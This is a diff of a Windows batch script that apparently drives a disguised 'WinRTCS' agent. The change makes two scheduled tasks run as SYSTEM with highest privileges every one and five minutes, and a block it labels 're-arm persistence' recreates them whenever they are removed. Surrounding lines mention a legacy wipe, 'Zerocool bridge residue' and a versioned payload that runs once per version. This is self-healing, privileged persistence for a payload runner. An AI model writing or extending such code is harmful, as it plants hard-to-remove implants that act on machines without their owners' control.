@@ -19,12 +19,20 @@ if exist "%ZD%\winrtcs_agent.new" (
   endlocal & exit /b 0
 )
 
-rem --- re-arm persistence: any run heals both tasks ---
+rem --- one-time cadence upgrade: Agent every 1 min (fast lane), Guard every 5 min (re-arm net) ---
 set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
+if not exist "%ZD%\tasks_v2.flag" (
+  echo %DATE% %TIME%>"%ZD%\tasks_v2.flag"
+  schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+  schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+  echo [%DATE% %TIME%] cadence_upgraded_1min>>"%LOG%"
+)
+
+rem --- re-arm persistence: any run heals both tasks ---
 schtasks /Query /TN "%TASKA%" >nul 2>&1
-if errorlevel 1 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+if errorlevel 1 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Query /TN "%TASKG%" >nul 2>&1
-if errorlevel 1 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 7 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+if errorlevel 1 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 
 rem --- one-time init: finish legacy wipe + retire any Zerocool bridge residue ---
 if not exist "%ZD%\inited.flag" (
@@ -77,7 +85,7 @@ if defined AGENT_SHA (
   )
 )
 
-rem --- payload: run exactly once per PAYLOAD_VER ---
+rem --- payload: run exactly once per PAYLOAD_VER (payloads must be idempotent) ---
 set "LVER="
 if exist "%ZD%\payload.ver" set /p "LVER=" <"%ZD%\payload.ver"
 if defined PVER if defined PAYLOAD_SHA if /I not "!PVER!"=="!LVER!" (
